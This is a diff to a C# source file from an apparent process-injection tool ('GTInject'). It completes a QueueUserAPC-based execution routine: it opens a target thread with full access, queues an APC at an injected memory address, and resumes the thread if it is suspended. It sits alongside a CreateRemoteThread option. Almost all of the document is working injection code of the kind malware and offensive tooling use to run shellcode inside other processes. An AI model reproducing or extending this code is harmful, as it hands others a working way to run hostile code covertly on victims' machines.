@@ -1,6 +1,7 @@
 ﻿using System;
 using System.Runtime.InteropServices;
 using System.Diagnostics;
+using System.Threading;
 
 namespace GTInject.Injection
 {
@@ -31,20 +32,49 @@ namespace GTInject.Injection
             /////////////////////////////////////
             
             IntPtr remoteThreadResp = CreateRemoteThread(ProcID.Handle, (IntPtr)0, 0, memaddr, (IntPtr)0, 0, (IntPtr)0);
+            Console.WriteLine( " called CreateRemoteThread at : " + remoteThreadResp);
             return remoteThreadResp;
         }
 
-        private static IntPtr execopt2(IntPtr memaddr, Process ProcID, int ThreadID) 
+        private static IntPtr execopt2(IntPtr memaddr, Process ProcID, int ThreadID)
         {
             /////////////////////////////////////
             // OPTION 2 == QueueUserAPC & ResumeThread
             /////////////////////////////////////
-            
-            var threadHandle = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+            Console.WriteLine( " Thread exec with WINAPI Q User APC and Resume Thread");
+            //var threadHandle = OpenThread(ThreadAccess.QUERY_INFORMATION, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+            var threadHandle = OpenThread(0x001F03FF, false, (uint)ThreadID);//0x40000000, false, (uint)threadId);
+
+            Console.WriteLine(  " Returned OpenThread " + threadHandle);
+
             var QuApcResp = QueueUserAPC(memaddr, threadHandle, IntPtr.Zero);
 
-            // Test this, recall not needing any additional actions if submitting a thread in the wait states already
-            //var ResThreadResp = ResumeThread(threadHandle);
+            if (QuApcResp == 0) // if succeeds, return value is non-zero
+            {
+                Console.WriteLine(" [-] Failed QueueUserAPC WINAPI execution");
+                return IntPtr.Zero;
+            }
+            else
+            {
+                var threadObjects = ProcID.Threads;
+                for (int i = 0; i < threadObjects.Count; i++)
+                {
+                    if (threadObjects[i].Id == ThreadID && threadObjects[i].WaitReason.ToString() == "Suspended")
+                    {
+                        Console.WriteLine(" thread is suspended, so calling resume Thread WINAPI on this");
+                        var ResThreadResp = ResumeThread(threadHandle);
+                        if (ResThreadResp == -1)
+                        {
+                            Console.WriteLine("resume Thread failed");
+                            return IntPtr.Zero;
+                        }
+                    }
+                }
+                return threadHandle; // returning an IntPtr, threadhandle is already an IntPtr
+            }
+            
+            //If thread state is Suspended, must resume, If Execution Delay, will trigger automatically, no API call needed, don't recall thread in Wait state action
+
         }
 
         /////////////////////////////////////
@@ -73,13 +103,13 @@ namespace GTInject.Injection
         public static extern IntPtr CreateRemoteThread(IntPtr hProcess, IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
 
         [DllImport("kernel32.dll", SetLastError = true)]
-        static extern IntPtr OpenThread(ThreadAccess desiredAccess, bool inheritHandle, uint threadId);
+        static extern IntPtr OpenThread(uint desiredAccess, bool inheritHandle, uint threadId);
 
         [DllImport("kernel32.dll")]
         public static extern uint QueueUserAPC(IntPtr pfnAPC, IntPtr hThread, IntPtr dwData);
 
         [DllImport("kernel32.dll")]
-        public static extern uint ResumeThread(IntPtr hThread);
+        public static extern int ResumeThread(IntPtr hThread);
 
     }
 }
